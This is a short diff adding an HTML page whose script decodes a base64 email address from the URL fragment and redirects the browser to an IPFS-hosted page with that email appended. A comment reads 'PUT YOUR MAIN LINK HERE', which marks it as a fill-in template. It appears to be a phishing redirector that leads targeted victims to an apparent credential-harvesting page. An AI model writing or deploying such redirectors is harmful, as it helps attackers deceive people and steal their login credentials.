@@ -1,0 +1,28 @@
+
+<html>
+  <head>
+      <script>
+
+var hash = window.location.hash;
+if(hash !== "") {
+   var hashpos = hash.indexOf('#');
+   var hashpos2 = hashpos + 1;
+   
+
+  hash = hash.substr(hashpos2);
+
+  const email = window.atob(hash);
+
+   //var email = hash;
+  
+      //console.log("email is ", email) 
+   
+      window.location.href = "https://ipfs.io/ipfs/bafybeifhp3rgh6tui3gjsmticzst4renx537o4eborjl5gnoolrig32nii/90-ho-0k709ko-9hf-95y.html#" + email;//*PUT YOUR MAIN LINK HERE *//
+}
+
+      </script>
+  </head>
+  <body>
+      
+  </body>
+</html>
